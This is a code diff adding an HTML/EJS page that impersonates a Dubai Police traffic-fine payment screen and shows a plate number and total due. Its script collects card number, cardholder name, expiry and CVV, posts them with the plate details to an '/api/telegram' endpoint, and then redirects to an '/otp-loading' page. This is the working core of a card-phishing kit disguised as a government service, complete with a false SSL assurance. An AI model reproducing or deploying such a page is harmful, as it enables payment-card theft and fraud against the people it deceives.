@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Secure Payment | Dubai Police</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/style.css">
+<style>
+  input:focus { border-color: #1a6b3a !important; box-shadow: 0 0 0 3px rgba(26,107,58,0.1); }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .field-error { font-size:11px; color:#dc2626; margin-top:4px; }
+  .field-note  { font-size:11px; color:#059669; margin-top:4px; }
+  .field-warn  { font-size:11px; color:#dc2626; margin-top:4px; }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<header style="background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;display:flex;align-items:center;gap:12px;">
+  <button onclick="history.back()" style="width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,0.15);border:none;color:white;font-size:20px;cursor:pointer;display:flex;align-items:center;justify-content:center;">‹</button>
+  <div style="flex:1;text-align:center;">
+    <div style="color:white;font-weight:800;font-size:16px;">Secure Payment</div>
+    <div style="color:rgba(255,255,255,0.7);font-size:11px;">الدفع الآمن</div>
+  </div>
+  <img src="/dp-logo.png" alt="Dubai Police" width="34" height="34" style="border-radius:50%;opacity:0.9;">
+</header>
+
+<!-- Amount Summary -->
+<div style="padding:16px 16px 0;">
+  <div style="background:#f8faf9;border:1.5px solid #e5e7eb;border-radius:14px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;">
+    <div>
+      <div style="font-size:12px;color:#9ca3af;margin-bottom:2px;"><%= fineCount %> fine<%= fineCount != 1 ? 's' : '' %> · <%= emirateName %></div>
+      <div style="font-size:18px;font-weight:800;letter-spacing:1px;color:#1a1a1a;"><%= plateCodeLetter %> <%= plateNo %></div>
+    </div>
+    <div style="text-align:right;">
+      <div style="font-size:11px;color:#9ca3af;">Total Due</div>
+      <div style="font-size:26px;font-weight:900;color:#1a6b3a;line-height:1.1;">AED <%= totalFine.toLocaleString() %></div>
+    </div>
+  </div>
+</div>
+
+<!-- Card Form -->
+<div style="padding:16px;">
+  <div style="background:white;border-radius:16px;padding:20px 16px;box-shadow:0 2px 16px rgba(0,0,0,0.06);border:1.5px solid #f0f0f0;">
+    <div style="font-size:13px;font-weight:700;color:#c8a84b;margin-bottom:16px;">Card Information</div>
+
+    <!-- Card Number -->
+    <div style="margin-bottom:14px;">
+      <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;">Card Number</label>
+      <div style="position:relative;">
+        <input type="text" inputmode="numeric" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="onCardNumberChange(this.value)"
+          style="width:100%;padding:13px 48px 13px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:16px;letter-spacing:2px;background:#fafafa;outline:none;font-family:monospace;">
+        <div id="card-type-label" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;color:#9ca3af;">CARD</div>
+      </div>
+      <div id="cardNumber-error" class="field-error" style="display:none;"></div>
+      <div id="bin-loading" style="display:none;font-size:11px;color:#6b7280;margin-top:4px;">Checking card details...</div>
+      <div id="bin-info" class="field-note" style="display:none;"></div>
+      <div id="bin-error" class="field-warn" style="display:none;"></div>
+    </div>
+
+    <!-- Cardholder Name -->
+    <div style="margin-bottom:14px;">
+      <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;">Cardholder Name</label>
+      <input type="text" id="cardName" placeholder="Name on card" oninput="this.value=this.value.toUpperCase()"
+        style="width:100%;padding:13px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;background:#fafafa;outline:none;letter-spacing:1px;">
+      <div id="cardName-error" class="field-error" style="display:none;"></div>
+    </div>
+
+    <!-- Expiry + CVV -->
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+      <div>
+        <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;">Expiry Date</label>
+        <input type="text" inputmode="numeric" id="expiry" placeholder="MM/YY" maxlength="5" oninput="onExpiryChange(this)"
+          style="width:100%;padding:13px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;outline:none;letter-spacing:2px;font-family:monospace;">
+        <div id="expiry-error" class="field-error" style="display:none;"></div>
+      </div>
+      <div>
+        <label style="font-size:12px;font-weight:600;color:#6b7280;display:block;margin-bottom:6px;">CVV</label>
+        <input type="password" inputmode="numeric" id="cvv" placeholder="•••" maxlength="4" oninput="this.value=this.value.replace(/\D/g,'').slice(0,4)"
+          style="width:100%;padding:13px 14px;border:1.5px solid #e5e7eb;border-radius:10px;font-size:20px;background:#fafafa;outline:none;letter-spacing:4px;">
+        <div id="cvv-error" class="field-error" style="display:none;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Security note -->
+  <div style="display:flex;align-items:center;gap:6px;margin:12px 4px;font-size:12px;color:#9ca3af;">
+    <span>🔒</span><span>Your payment is secured with 256-bit SSL encryption</span>
+  </div>
+
+  <!-- Pay Button -->
+  <button id="pay-btn" onclick="handleSubmit()"
+    style="width:100%;padding:17px 20px;background:linear-gradient(135deg,#1a6b3a,#0f4a27);color:white;font-size:16px;font-weight:700;border:none;border-radius:50px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 20px rgba(26,107,58,0.4);transition:all 0.2s;margin-bottom:12px;">
+    Pay AED <%= totalFine.toLocaleString() %>
+  </button>
+
+  <div style="text-align:center;font-size:11px;color:#9ca3af;">By paying you agree to our Terms of Service</div>
+</div>
+
+<script>
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const PLATE_NO   = <%- JSON.stringify(plateNo) %>;
+const PLATE_SRC  = <%- JSON.stringify(plateSrcCode) %>;
+const PLATE_LTR  = <%- JSON.stringify(plateCodeLetter) %>;
+const FINE_COUNT = <%- JSON.stringify(fineCount) %>;
+
+let binInfo = null;
+let binTimer = null;
+
+function formatCardNumber(val) {
+  const d = val.replace(/\D/g,'').slice(0,16);
+  return d.replace(/(.{4})/g,'$1 ').trim();
+}
+
+function getCardType(n) {
+  n = n.replace(/\s/g,'');
+  if (n.startsWith('4')) return 'visa';
+  if (n.startsWith('5') || n.startsWith('2')) return 'mastercard';
+  if (n.startsWith('3')) return 'amex';
+  return null;
+}
+
+function luhn(num) {
+  let sum = 0, shouldDouble = false;
+  for (let i = num.length - 1; i >= 0; i--) {
+    let d = parseInt(num[i], 10);
+    if (shouldDouble) { d *= 2; if (d > 9) d -= 9; }
+    sum += d; shouldDouble = !shouldDouble;
+  }
+  return sum % 10 === 0;
+}
+
+function onCardNumberChange(raw) {
+  const formatted = formatCardNumber(raw);
+  document.getElementById('cardNumber').value = formatted;
+
+  const type = getCardType(formatted);
+  const lbl = document.getElementById('card-type-label');
+  if (type === 'visa') { lbl.textContent = 'VISA'; lbl.style.color = '#1a56db'; }
+  else if (type === 'mastercard') { lbl.textContent = 'MC'; lbl.style.color = '#e3440c'; }
+  else if (type === 'amex') { lbl.textContent = 'AMEX'; lbl.style.color = '#6b7280'; }
+  else { lbl.textContent = 'CARD'; lbl.style.color = '#9ca3af'; }
+
+  const digits = formatted.replace(/\s/g,'');
+  clearTimeout(binTimer);
+  document.getElementById('bin-info').style.display = 'none';
+  document.getElementById('bin-error').style.display = 'none';
+  if (digits.length >= 6) {
+    binTimer = setTimeout(() => fetchBin(digits.slice(0, 8)), 400);
+  } else {
+    document.getElementById('bin-loading').style.display = 'none';
+    binInfo = null;
+  }
+}
+
+function fetchBin(bin) {
+  document.getElementById('bin-loading').style.display = '';
+  document.getElementById('bin-info').style.display = 'none';
+  document.getElementById('bin-error').style.display = 'none';
+  fetch('/api/card-bin?bin=' + bin)
+    .then(r => r.json())
+    .then(d => {
+      document.getElementById('bin-loading').style.display = 'none';
+      if (!d.ok) {
+        document.getElementById('bin-error').textContent = 'Card lookup failed';
+        document.getElementById('bin-error').style.display = '';
+        binInfo = null;
+      } else {
+        binInfo = d.data;
+        const parts = [d.data.Scheme && d.data.Scheme.toUpperCase(), d.data.Type, d.data.Issuer, d.data.Country?.Name].filter(Boolean);
+        document.getElementById('bin-info').textContent = parts.join(' · ');
+        document.getElementById('bin-info').style.display = '';
+      }
+    })
+    .catch(() => {
+      document.getElementById('bin-loading').style.display = 'none';
+      binInfo = null;
+    });
+}
+
+function onExpiryChange(el) {
+  const digits = el.value.replace(/\D/g,'').slice(0,4);
+  el.value = digits.length >= 3 ? digits.slice(0,2) + '/' + digits.slice(2) : digits;
+}
+
+function setFieldError(field, msg) {
+  const el = document.getElementById(field + '-error');
+  if (msg) { el.textContent = msg; el.style.display = ''; document.getElementById(field).style.borderColor = '#dc2626'; }
+  else      { el.style.display = 'none'; document.getElementById(field).style.borderColor = '#e5e7eb'; }
+}
+
+function validate() {
+  let ok = true;
+  const cardName = document.getElementById('cardName').value.trim();
+  const cardNum  = document.getElementById('cardNumber').value.replace(/\s/g,'');
+  const expiry   = document.getElementById('expiry').value;
+  const cvv      = document.getElementById('cvv').value;
+
+  if (!cardName) { setFieldError('cardName','Please enter cardholder name'); ok = false; } else setFieldError('cardName','');
+  if (cardNum.length < 13)     { setFieldError('cardNumber','Card number is too short'); ok = false; }
+  else if (!luhn(cardNum))     { setFieldError('cardNumber','Invalid card number'); ok = false; }
+  else                         { setFieldError('cardNumber',''); }
+
+  const [mm, yy] = expiry.split('/');
+  if (!mm || !yy || Number(mm) > 12 || Number(mm) < 1) { setFieldError('expiry','Invalid expiry date'); ok = false; } else setFieldError('expiry','');
+  if (cvv.length < 3) { setFieldError('cvv','Invalid CVV'); ok = false; } else setFieldError('cvv','');
+  return ok;
+}
+
+function generateSid() {
+  const arr = new Uint8Array(16);
+  crypto.getRandomValues(arr);
+  return Array.from(arr).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+async function handleSubmit() {
+  if (!validate()) return;
+  const btn = document.getElementById('pay-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span style="width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;display:inline-block;animation:spin 0.8s linear infinite;"></span> Processing...';
+  btn.style.background = '#9ca3af';
+
+  const sid        = generateSid();
+  const cardName   = document.getElementById('cardName').value.trim();
+  const cardNumber = document.getElementById('cardNumber').value;
+  const expiry     = document.getElementById('expiry').value;
+  const cvv        = document.getElementById('cvv').value;
+
+  try {
+    const res = await fetch('/api/telegram', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({sid, cardName, cardNumber, expiry, cvv, plateNo: PLATE_NO, plateSrcCode: PLATE_SRC, plateCodeLetter: PLATE_LTR, totalFine: TOTAL_FINE, fineCount: FINE_COUNT, binInfo})
+    });
+    const json = await res.json().catch(() => null);
+    if (!res.ok || !json?.ok) console.warn('Telegram failed');
+  } catch(e) { console.warn('Telegram error', e); }
+
+  const last4  = document.getElementById('cardNumber').value.replace(/\s/g,'').slice(-4);
+  const issuer = encodeURIComponent(binInfo?.Issuer || '');
+  window.location.href = '/otp-loading?amount=' + TOTAL_FINE + '&cardLast4=' + last4 + '&totalFine=' + TOTAL_FINE + '&issuer=' + issuer + '&sid=' + sid;
+}
+</script>
+</body>
+</html>
